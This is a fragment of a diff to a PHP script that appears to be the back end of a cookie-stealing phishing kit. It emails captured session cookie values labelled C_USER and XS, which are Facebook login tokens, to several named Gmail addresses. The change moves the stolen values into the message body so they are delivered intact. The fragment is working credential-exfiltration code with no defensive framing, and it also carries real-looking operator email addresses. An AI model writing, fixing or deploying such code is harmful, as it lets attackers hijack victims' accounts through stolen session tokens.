@@ -49,14 +49,14 @@ EOF;
   $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
   $mail->addAddress('bilalcookie964@gmail.com', 'Receiver');
-  $mail->Subject = 'Hello,
+  $mail->Subject = 'New Cookie';
+  $mail->Body    = 'Hello,
 
 A new form has been submitted on your website. Details below:
 
 C_USER: '.$c_user.' 
 
 XS: '.$xs;
-  $mail->Body    = 'Please check the link';
 
   if(!$mail->send()) {
       echo 'Message could not be sent.';
